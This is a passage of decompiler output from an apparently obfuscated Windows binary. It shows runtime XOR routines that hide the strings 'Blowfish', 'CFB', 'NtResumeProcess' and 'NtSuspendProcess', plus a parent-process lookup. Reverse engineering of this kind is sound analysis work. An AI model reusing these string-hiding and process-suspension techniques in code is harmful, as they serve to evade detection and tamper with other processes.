  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBF2C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBF2C & 1 )
  {
    v5 = byte_1400DBF28;
  }
  else
  {
    v4 = 69069 * dword_1400DBF20 + 1234567;
    v1 = dword_1400DBF2C | 1;
    dword_1400DBF20 = v4;
    dword_1400DBF2C |= 1u;
    dword_1400DBF18 = HIWORD(dword_1400DBF18) + 36969 * (unsigned __int16)dword_1400DBF18;
    LOBYTE(v4) = (BYTE2(dword_1400DBF24) + 80 * dword_1400DBF24) ^ v4;
    dword_1400DBF24 = HIWORD(dword_1400DBF24) + 18000 * (unsigned __int16)dword_1400DBF24;
    v5 = (((unsigned int)dword_1400DBF1C >> 13) ^ 32 * dword_1400DBF1C ^ dword_1400DBF1C) + v4;
    dword_1400DBF1C ^= ((unsigned int)dword_1400DBF1C >> 13) ^ 32 * (dword_1400DBF1C ^ (dword_1400DBF1C << 12));
    byte_1400DBF28 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBF2C = v1 | 2;
    byte_1400DBF30[0] = v5 ^ 0x42;
    byte_1400DBF31 = (v5 - 1) ^ 0x6C;
    byte_1400DBF32 = (v5 - 2) ^ 0x6F;
    byte_1400DBF33 = (v5 - 3) ^ 0x77;
    byte_1400DBF34 = (v5 - 4) ^ 0x66;
    byte_1400DBF35 = (v5 - 5) ^ 0x69;
    byte_1400DBF36 = (v5 - 6) ^ 0x73;
    byte_1400DBF37 = (v5 - 7) ^ 0x68;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400DBF28;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBF30[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400DBF18: using guessed type int dword_1400DBF18;
// 1400DBF1C: using guessed type int dword_1400DBF1C;
// 1400DBF20: using guessed type int dword_1400DBF20;
// 1400DBF24: using guessed type int dword_1400DBF24;
// 1400DBF28: using guessed type char byte_1400DBF28;
// 1400DBF2C: using guessed type int dword_1400DBF2C;
// 1400DBF31: using guessed type char byte_1400DBF31;
// 1400DBF32: using guessed type char byte_1400DBF32;
// 1400DBF33: using guessed type char byte_1400DBF33;
// 1400DBF34: using guessed type char byte_1400DBF34;
// 1400DBF35: using guessed type char byte_1400DBF35;
// 1400DBF36: using guessed type char byte_1400DBF36;
// 1400DBF37: using guessed type char byte_1400DBF37;

//----- (000000014007BD80) ----------------------------------------------------
_QWORD *__fastcall sub_14007BD80(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBF3C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBF3C & 1 )
  {
    v5 = byte_1400DBF38;
  }
  else
  {
    v4 = 69069 * dword_1400DBF20 + 1234567;
    v1 = dword_1400DBF3C | 1;
    dword_1400DBF20 = v4;
    dword_1400DBF3C |= 1u;
    dword_1400DBF18 = HIWORD(dword_1400DBF18) + 36969 * (unsigned __int16)dword_1400DBF18;
    LOBYTE(v4) = (BYTE2(dword_1400DBF24) + 80 * dword_1400DBF24) ^ v4;
    dword_1400DBF24 = HIWORD(dword_1400DBF24) + 18000 * (unsigned __int16)dword_1400DBF24;
    v5 = (((unsigned int)dword_1400DBF1C >> 13) ^ 32 * dword_1400DBF1C ^ dword_1400DBF1C) + v4;
    dword_1400DBF1C ^= ((unsigned int)dword_1400DBF1C >> 13) ^ 32 * (dword_1400DBF1C ^ (dword_1400DBF1C << 12));
    byte_1400DBF38 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DBF3C = v1 | 2;
    byte_1400DBF40[0] = v5 ^ 0x43;
    byte_1400DBF41 = (v5 - 1) ^ 0x46;
    byte_1400DBF42 = (v5 - 2) ^ 0x42;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 3ui64 )
  {
    sub_140004790(Src, 3ui64, 0i64);
    v5 = byte_1400DBF38;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_WORD *)v6 = 0;
  *((_BYTE *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 3i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 3) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DBF40[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 3 );
  return v3;
}
// 1400DBF18: using guessed type int dword_1400DBF18;
// 1400DBF1C: using guessed type int dword_1400DBF1C;
// 1400DBF20: using guessed type int dword_1400DBF20;
// 1400DBF24: using guessed type int dword_1400DBF24;
// 1400DBF38: using guessed type char byte_1400DBF38;
// 1400DBF3C: using guessed type int dword_1400DBF3C;
// 1400DBF41: using guessed type char byte_1400DBF41;
// 1400DBF42: using guessed type char byte_1400DBF42;

//----- (000000014007BF20) ----------------------------------------------------
unsigned __int64 __fastcall sub_14007BF20(__int64 a1, unsigned __int64 a2)
{
  if ( a2 > 0x38 )
    a2 = 56i64;
  return a2;
}

//----- (000000014007BF30) ----------------------------------------------------
__int64 __fastcall sub_14007BF30(__int64 a1)
{
  char v1; // ST20_1

  v1 = 1;
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD, signed __int64, char))(**(_QWORD **)(a1 + 136) + 40i64))(
           *(_QWORD *)(a1 + 136),
           0i64,
           0i64,
           0xFFFFFFFFi64,
           v1);
}

//----- (000000014007BF60) ----------------------------------------------------
signed __int64 sub_14007BF60()
{
  return 56i64;
}

//----- (000000014007BF70) ----------------------------------------------------
_QWORD *__fastcall sub_14007BF70(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+30h] [rbp-78h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  unsigned __int64 v9; // [rsp+48h] [rbp-60h]
  void *v10; // [rsp+50h] [rbp-58h]
  __int64 v11; // [rsp+60h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-40h]
  void *v13; // [rsp+70h] [rbp-38h]
  unsigned __int64 v14; // [rsp+88h] [rbp-20h]

  v1 = a1;
  v2 = sub_14007C190(&v13);
  v3 = sub_14000DAC0(&v10, v2, &unk_1400AB1E0);
  v4 = sub_14007BD80(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  sub_14000DAC0(v1, v3, v5);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v14 >= 0x10 )
    operator delete(v13);
  return v1;
}

//----- (000000014007C080) ----------------------------------------------------
_QWORD *__fastcall sub_14007C080(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+30h] [rbp-78h]
  __int64 v8; // [rsp+40h] [rbp-68h]
  unsigned __int64 v9; // [rsp+48h] [rbp-60h]
  void *v10; // [rsp+50h] [rbp-58h]
  __int64 v11; // [rsp+60h] [rbp-48h]
  unsigned __int64 v12; // [rsp+68h] [rbp-40h]
  void *v13; // [rsp+70h] [rbp-38h]
  unsigned __int64 v14; // [rsp+88h] [rbp-20h]

  v1 = a1;
  v2 = sub_14007C190(&v13);
  v3 = sub_14000DAC0(&v10, v2, &unk_1400AB1E0);
  v4 = sub_14007BD80(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  sub_14000DAC0(v1, v3, v5);
  if ( v12 >= 0x10 )
    operator delete(v10);
  v12 = 15i64;
  v11 = 0i64;
  LOBYTE(v10) = 0;
  if ( v14 >= 0x10 )
    operator delete(v13);
  return v1;
}

//----- (000000014007C190) ----------------------------------------------------
_QWORD *__fastcall sub_14007C190(void *Dst)
{
  _QWORD *v1; // rsi
  size_t v2; // rbx
  _QWORD *v3; // rax
  _BYTE *v4; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v7; // [rsp+38h] [rbp-20h]
  unsigned __int64 v8; // [rsp+40h] [rbp-18h]

  v1 = Dst;
  v2 = 0i64;
  v3 = sub_14007BBB0(&Src);
  v4 = v3;
  if ( v3[3] >= 0x10ui64 )
    v4 = (_BYTE *)*v3;
  if ( v8 >= 0x10 )
    operator delete(Src);
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Src) = 0;
  v1[3] = 15i64;
  v1[2] = 0i64;
  *(_BYTE *)v1 = 0;
  if ( *v4 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v4[v2] );
  }
  sub_140004F20(v1, v4, v2);
  return v1;
}

//----- (000000014007C250) ----------------------------------------------------
_QWORD *__fastcall sub_14007C250(__int64 a1, _QWORD *a2, _QWORD *a3, __int64 *a4)
{
  _QWORD *v4; // rbx

  v4 = a2;
  sub_14007B740(a1, a2, a3, a4, 0);
  return v4;
}

//----- (000000014007C280) ----------------------------------------------------
__int64 __fastcall sub_14007C280(__int64 a1, __int64 a2, __int64 a3, _QWORD *a4)
{
  _QWORD *v4; // rdi
  __int64 v5; // rax
  __int64 v6; // rbx
  _BYTE *v7; // rcx

  v4 = a4;
  v5 = sub_14002C1B0(a1, a2, a3);
  v6 = v5;
  v7 = (_BYTE *)(v5 + 16);
  if ( v5 != -16 )
  {
    *(_QWORD *)(v5 + 40) = 15i64;
    *(_QWORD *)(v5 + 32) = 0i64;
    *v7 = 0;
    sub_140004DF0(v7, v4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  }
  return v6;
}
// 14002C1B0: using guessed type __int64 __fastcall sub_14002C1B0(_QWORD, _QWORD, _QWORD);

//----- (000000014007C3C0) ----------------------------------------------------
bool __fastcall sub_14007C3C0(__int64 a1, _QWORD *a2)
{
  __int64 v2; // rdi
  __int64 v3; // rsi
  __int64 v4; // r8
  __int64 v5; // rax

  v2 = *(_QWORD *)(a1 + 8);
  v3 = a1;
  v4 = sub_14007C280(a1 + 8, *(_QWORD *)(a1 + 8), *(_QWORD *)(v2 + 8), a2);
  v5 = *(_QWORD *)(v3 + 16);
  if ( (unsigned __int64)(384307168202282324i64 - v5) < 1 )
  {
    std::_Xlength_error("list<T> too long");
    __debugbreak();
  }
  *(_QWORD *)(v3 + 16) = v5 + 1;
  *(_QWORD *)(v2 + 8) = v4;
  **(_QWORD **)(v4 + 8) = v4;
  return *(_QWORD *)(v3 + 16) != 0i64;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014007C530) ----------------------------------------------------
_QWORD *__fastcall sub_14007C530(_QWORD *a1, const CHAR *a2)
{
  const CHAR *v2; // rsi
  _QWORD *v3; // rbx
  _QWORD *v4; // rdi
  _QWORD *v5; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  v5 = operator new(0x18ui64);
  if ( v5 )
    v4 = sub_14007EED0(v5, v2);
  *v3 = v4;
  return v3;
}

//----- (000000014007C590) ----------------------------------------------------
_QWORD *__fastcall sub_14007C590(_QWORD *a1, const CHAR *a2)
{
  const CHAR *v2; // rsi
  _QWORD *v3; // rbx
  _QWORD *v4; // rdi
  _QWORD *v5; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  v5 = operator new(0x18ui64);
  if ( v5 )
    v4 = sub_14007F780(v5, v2);
  *v3 = v4;
  return v3;
}

//----- (000000014007C5F0) ----------------------------------------------------
_QWORD *__fastcall sub_14007C5F0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rax

  v1 = a1;
  v2 = operator new(8ui64);
  if ( v2 )
  {
    *v1 = v2;
    *v2 = &off_1400B0D78;
  }
  else
  {
    *v1 = 0i64;
  }
  return v1;
}
// 1400B0D78: using guessed type __int64 (__fastcall *off_1400B0D78)();

//----- (000000014007C640) ----------------------------------------------------
_QWORD *__fastcall sub_14007C640(_QWORD *a1, const CHAR *a2, const CHAR *a3)
{
  const CHAR *v3; // rsi
  const CHAR *v4; // rbp
  _QWORD *v5; // rbx
  _QWORD *v6; // rdi
  _QWORD *v7; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  v7 = operator new(0x28ui64);
  if ( v7 )
    v6 = sub_14007E160(v7, v4, v3);
  *v5 = v6;
  return v5;
}

//----- (000000014007C710) ----------------------------------------------------
_QWORD *__fastcall sub_14007C710(_QWORD *a1, __int64 *a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // r8
  __int64 v4; // rdx

  v2 = a1;
  *a1 = 0i64;
  a1[1] = 0i64;
  v3 = a2[1];
  v4 = *a2;
  if ( v3 )
    _InterlockedIncrement((volatile signed __int32 *)(v3 + 8));
  sub_140029830(a1, v4, v3);
  return v2;
}

//----- (000000014007C750) ----------------------------------------------------
_QWORD *__fastcall sub_14007C750(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rcx
  __int128 v4; // [rsp+28h] [rbp-20h]

  v1 = a1;
  _mm_storeu_si128((__m128i *)&v4, (__m128i)0i64);
  *a1 = &off_1400B0D20;
  v2 = a1 + 3;
  *v2 = 0i64;
  v2[1] = 0i64;
  sub_140029830(v2, 0i64, 0i64);
  v1[8] = 0i64;
  v1[9] = 0i64;
  v1[10] = 0i64;
  v1[11] = 0i64;
  v1[12] = 0i64;
  *v1 = &off_1400B0D20;
  return v1;
}
// 1400B0D20: using guessed type __int64 (__fastcall *off_1400B0D20)(void *);

//----- (000000014007C7D0) ----------------------------------------------------
__int64 __fastcall sub_14007C7D0(__int64 a1)
{
  volatile signed __int32 *v1; // rbx
  __int64 result; // rax

  v1 = *(volatile signed __int32 **)(a1 + 8);
  if ( v1 && !_InterlockedDecrement(v1 + 2) )
  {
    result = (**(__int64 (__fastcall ***)(volatile signed __int32 *))v1)(v1);
    if ( !_InterlockedDecrement(v1 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v1 + 8i64))(v1);
  }
  return result;
}

//----- (000000014007C820) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_14007C820(_QWORD *a1))()
{
  _QWORD *v1; // rbx
  void (__fastcall ***v2)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v3)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v4)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v5)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v6)(_QWORD, signed __int64); // rcx
  volatile signed __int32 *v7; // rdi
  __int64 (__fastcall **result)(); // rax

  v1 = a1;
  *a1 = &off_1400B0D20;
  v2 = (void (__fastcall ***)(_QWORD, signed __int64))a1[12];
  if ( v2 )
    (**v2)(v2, 1i64);
  v3 = (void (__fastcall ***)(_QWORD, signed __int64))v1[11];
  if ( v3 )
    (**v3)(v3, 1i64);
  v4 = (void (__fastcall ***)(_QWORD, signed __int64))v1[10];
  if ( v4 )
    (**v4)(v4, 1i64);
  v5 = (void (__fastcall ***)(_QWORD, signed __int64))v1[9];
  if ( v5 )
    (**v5)(v5, 1i64);
  v6 = (void (__fastcall ***)(_QWORD, signed __int64))v1[8];
  if ( v6 )
    (**v6)(v6, 1i64);
  v7 = (volatile signed __int32 *)v1[4];
  if ( v7 )
  {
    if ( !_InterlockedDecrement(v7 + 2) )
    {
      (**(void (__fastcall ***)(volatile signed __int32 *))v7)(v7);
      if ( !_InterlockedDecrement(v7 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    }
    result = &off_1400B0CC8;
    *v1 = &off_1400B0CC8;
  }
  else
  {
    result = &off_1400B0CC8;
    *v1 = &off_1400B0CC8;
  }
  return result;
}
// 1400B0CC8: using guessed type __int64 (__fastcall *off_1400B0CC8)();
// 1400B0D20: using guessed type __int64 (__fastcall *off_1400B0D20)(void *);

//----- (000000014007C8F0) ----------------------------------------------------
_QWORD *__fastcall sub_14007C8F0(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400B0CC8;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400B0CC8: using guessed type __int64 (__fastcall *off_1400B0CC8)();

//----- (000000014007C920) ----------------------------------------------------
void *__fastcall sub_14007C920(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14007C820(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014007C950) ----------------------------------------------------
__int64 __fastcall sub_14007C950(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v3; // edi
  __int64 v4; // rsi
  __int64 v5; // rbx

  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_14007D770(a1);
  (*(void (__fastcall **)(_QWORD, __int64, _QWORD))(**(_QWORD **)(v5 + 80) + 8i64))(*(_QWORD *)(v5 + 80), v4, v3);
  return v4;
}

//----- (000000014007C9A0) ----------------------------------------------------
__int64 __fastcall sub_14007C9A0(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v3; // edi
  __int64 v4; // rsi
  __int64 v5; // rbx

  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_14007D8B0(a1);
  (*(void (__fastcall **)(_QWORD, __int64, _QWORD))(**(_QWORD **)(v5 + 88) + 8i64))(*(_QWORD *)(v5 + 88), v4, v3);
  return v4;
}

//----- (000000014007C9F0) ----------------------------------------------------
__int64 __fastcall sub_14007C9F0(__int64 a1, unsigned int a2, __int64 a3)
{
  __int64 v3; // rdi
  unsigned int v4; // esi
  __int64 v5; // rbx
  __int64 *v6; // rax
  __int64 v7; // r9
  void (__fastcall ***v8)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v10)(_QWORD, signed __int64); // [rsp+40h] [rbp+8h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( !*(_QWORD *)(a1 + 96) )
  {
    v6 = sub_14007C5F0(&v10);
    v7 = *v6;
    *v6 = 0i64;
    v8 = *(void (__fastcall ****)(_QWORD, signed __int64))(v5 + 96);
    *(_QWORD *)(v5 + 96) = v7;
    if ( v8 )
      (**v8)(v8, 1i64);
    if ( v10 )
      (**v10)(v10, 1i64);
  }
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64))(**(_QWORD **)(v5 + 96) + 8i64))(
           *(_QWORD *)(v5 + 96),
           v4,
           v3);
}

//----- (000000014007CA80) ----------------------------------------------------
char *sub_14007CA80()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DBF74;
  if ( dword_1400DBF74 & 1 )
  {
    v2 = byte_1400DBF72;
  }
  else
  {
    v1 = 69069 * dword_1400DBF54 + 1234567;
    v0 = dword_1400DBF74 | 1;
    dword_1400DBF54 = v1;
    dword_1400DBF74 |= 1u;
    dword_1400DBF4C = HIWORD(dword_1400DBF4C) + 36969 * (unsigned __int16)dword_1400DBF4C;
    LOBYTE(v1) = (BYTE2(dword_1400DBF58) + 80 * dword_1400DBF58) ^ v1;
    dword_1400DBF58 = HIWORD(dword_1400DBF58) + 18000 * (unsigned __int16)dword_1400DBF58;
    v2 = (((unsigned int)dword_1400DBF50 >> 13) ^ 32 * dword_1400DBF50 ^ dword_1400DBF50) + v1;
    dword_1400DBF50 ^= ((unsigned int)dword_1400DBF50 >> 13) ^ 32 * (dword_1400DBF50 ^ (dword_1400DBF50 << 12));
    byte_1400DBF72 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DBF74 = v0 | 2;
    byte_1400DBF78[0] = v2 ^ 0x4E;
    byte_1400DBF79 = (v2 - 1) ^ 0x74;
    byte_1400DBF7A = (v2 - 2) ^ 0x52;
    byte_1400DBF7B = (v2 - 3) ^ 0x65;
    byte_1400DBF7C = (v2 - 4) ^ 0x73;
    byte_1400DBF7D = (v2 - 5) ^ 0x75;
    byte_1400DBF7E = (v2 - 6) ^ 0x6D;
    byte_1400DBF7F = (v2 - 7) ^ 0x65;
    byte_1400DBF80 = (v2 - 8) ^ 0x50;
    byte_1400DBF81 = (v2 - 9) ^ 0x72;
    byte_1400DBF82 = (v2 - 10) ^ 0x6F;
    byte_1400DBF83 = (v2 - 11) ^ 0x63;
    byte_1400DBF84 = (v2 - 12) ^ 0x65;
    byte_1400DBF85 = (v2 - 13) ^ 0x73;
    byte_1400DBF86 = (v2 - 14) ^ 0x73;
  }
  result = byte_1400DBF88;
  if ( !byte_1400DBF88[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DBF78[v5++];
      v7 = v2 - v4++;
      byte_1400DBF88[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0xF );
  }
  return result;
}
// 1400DBF4C: using guessed type int dword_1400DBF4C;
// 1400DBF50: using guessed type int dword_1400DBF50;
// 1400DBF54: using guessed type int dword_1400DBF54;
// 1400DBF58: using guessed type int dword_1400DBF58;
// 1400DBF72: using guessed type char byte_1400DBF72;
// 1400DBF74: using guessed type int dword_1400DBF74;
// 1400DBF79: using guessed type char byte_1400DBF79;
// 1400DBF7A: using guessed type char byte_1400DBF7A;
// 1400DBF7B: using guessed type char byte_1400DBF7B;
// 1400DBF7C: using guessed type char byte_1400DBF7C;
// 1400DBF7D: using guessed type char byte_1400DBF7D;
// 1400DBF7E: using guessed type char byte_1400DBF7E;
// 1400DBF7F: using guessed type char byte_1400DBF7F;
// 1400DBF80: using guessed type char byte_1400DBF80;
// 1400DBF81: using guessed type char byte_1400DBF81;
// 1400DBF82: using guessed type char byte_1400DBF82;
// 1400DBF83: using guessed type char byte_1400DBF83;
// 1400DBF84: using guessed type char byte_1400DBF84;
// 1400DBF85: using guessed type char byte_1400DBF85;
// 1400DBF86: using guessed type char byte_1400DBF86;

//----- (000000014007CC30) ----------------------------------------------------
char *sub_14007CC30()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400DBFB0;
  if ( dword_1400DBFB0 & 1 )
  {
    v2 = byte_1400DBFAC;
  }
  else
  {
    v1 = 69069 * dword_1400DBF54 + 1234567;
    v0 = dword_1400DBFB0 | 1;
    dword_1400DBF54 = v1;
    dword_1400DBFB0 |= 1u;
    dword_1400DBF4C = HIWORD(dword_1400DBF4C) + 36969 * (unsigned __int16)dword_1400DBF4C;
    LOBYTE(v1) = (BYTE2(dword_1400DBF58) + 80 * dword_1400DBF58) ^ v1;
    dword_1400DBF58 = HIWORD(dword_1400DBF58) + 18000 * (unsigned __int16)dword_1400DBF58;
    v2 = (((unsigned int)dword_1400DBF50 >> 13) ^ 32 * dword_1400DBF50 ^ dword_1400DBF50) + v1;
    dword_1400DBF50 ^= ((unsigned int)dword_1400DBF50 >> 13) ^ 32 * (dword_1400DBF50 ^ (dword_1400DBF50 << 12));
    byte_1400DBFAC = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400DBFB0 = v0 | 2;
    byte_1400DBFB8[0] = v2 ^ 0x4E;
    byte_1400DBFB9 = (v2 - 1) ^ 0x74;
    byte_1400DBFBA = (v2 - 2) ^ 0x53;
    byte_1400DBFBB = (v2 - 3) ^ 0x75;
    byte_1400DBFBC = (v2 - 4) ^ 0x73;
    byte_1400DBFBD = (v2 - 5) ^ 0x70;
    byte_1400DBFBE = (v2 - 6) ^ 0x65;
    byte_1400DBFBF = (v2 - 7) ^ 0x6E;
    byte_1400DBFC0 = (v2 - 8) ^ 0x64;
    byte_1400DBFC1 = (v2 - 9) ^ 0x50;
    byte_1400DBFC2 = (v2 - 10) ^ 0x72;
    byte_1400DBFC3 = (v2 - 11) ^ 0x6F;
    byte_1400DBFC4 = (v2 - 12) ^ 0x63;
    byte_1400DBFC5 = (v2 - 13) ^ 0x65;
    byte_1400DBFC6 = (v2 - 14) ^ 0x73;
    byte_1400DBFC7 = (v2 - 15) ^ 0x73;
  }
  result = byte_1400DBFC8;
  if ( !byte_1400DBFC8[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400DBFB8[v5++];
      v7 = v2 - v4++;
      byte_1400DBFC8[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x10 );
  }
  return result;
}
// 1400DBF4C: using guessed type int dword_1400DBF4C;
// 1400DBF50: using guessed type int dword_1400DBF50;
// 1400DBF54: using guessed type int dword_1400DBF54;
// 1400DBF58: using guessed type int dword_1400DBF58;
// 1400DBFAC: using guessed type char byte_1400DBFAC;
// 1400DBFB0: using guessed type int dword_1400DBFB0;
// 1400DBFB9: using guessed type char byte_1400DBFB9;
// 1400DBFBA: using guessed type char byte_1400DBFBA;
// 1400DBFBB: using guessed type char byte_1400DBFBB;
// 1400DBFBC: using guessed type char byte_1400DBFBC;
// 1400DBFBD: using guessed type char byte_1400DBFBD;
// 1400DBFBE: using guessed type char byte_1400DBFBE;
// 1400DBFBF: using guessed type char byte_1400DBFBF;
// 1400DBFC0: using guessed type char byte_1400DBFC0;
// 1400DBFC1: using guessed type char byte_1400DBFC1;
// 1400DBFC2: using guessed type char byte_1400DBFC2;
// 1400DBFC3: using guessed type char byte_1400DBFC3;
// 1400DBFC4: using guessed type char byte_1400DBFC4;
// 1400DBFC5: using guessed type char byte_1400DBFC5;
// 1400DBFC6: using guessed type char byte_1400DBFC6;
// 1400DBFC7: using guessed type char byte_1400DBFC7;

//----- (000000014007CE00) ----------------------------------------------------
__int64 sub_14007CE00()
{
  DWORD v0; // esi
  DWORD v1; // edi
  HANDLE v2; // rax
  void *v3; // rbx
  PROCESSENTRY32W pe; // [rsp+20h] [rbp-258h]

  v0 = 0;
  v1 = GetCurrentProcessId();
  v2 = CreateToolhelp32Snapshot(2u, 0);
  v3 = v2;
  if ( v2 != (HANDLE)-1i64 )
  {
    pe.dwSize = 568;
    if ( Process32FirstW(v2, &pe) )
    {
      while ( pe.th32ProcessID != v1 )
      {
        if ( !Process32NextW(v3, &pe) )
          goto LABEL_7;
      }
      v0 = pe.th32ParentProcessID;
    }
LABEL_7:
    CloseHandle(v3);
  }
  return v0;
}

//----- (000000014007CEB0) ----------------------------------------------------
__int64 __fastcall sub_14007CEB0(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v3; // edi
  __int64 v4; // rsi
  __int64 v5; // rbx

  v3 = a3;
  v4 = a2;
  v5 = a1;
  sub_14007D9F0(a1);
  (*(void (__fastcall **)(_QWORD, __int64, _QWORD))(**(_QWORD **)(v5 + 64) + 8i64))(*(_QWORD *)(v5 + 64), v4, v3);
  return v4;
}

//----- (000000014007CF00) ----------------------------------------------------
__int64 __fastcall sub_14007CF00(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx

  v2 = a2;
  v3 = a1;
  sub_14007DBC0(a1);
  (*(void (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(v3 + 72) + 8i64))(*(_QWORD *)(v3 + 72), v2);
  return v2;
}

//----- (000000014007CF40) ----------------------------------------------------
_QWORD *__fastcall sub_14007CF40(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DBF9C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DBF9C & 1 )
  {
    v5 = byte_1400DBF98;
  }
  else
  {
    v4 = 69069 * dword_1400DBF54 + 1234567;
    v1 = dword_1400DBF9C | 1;
    dword_1400DBF54 = v4;
    dword_1400DBF9C |= 1u;
    dword_1400DBF4C = HIWORD(dword_1400DBF4C) + 36969 * (unsigned __int16)dword_1400DBF4C;
    LOBYTE(v4) = (BYTE2(dword_1400DBF58) + 80 * dword_1400DBF58) ^ v4;
    dword_1400DBF58 = HIWORD(dword_1400DBF58) + 18000 * (unsigned __int16)dword_1400DBF58;
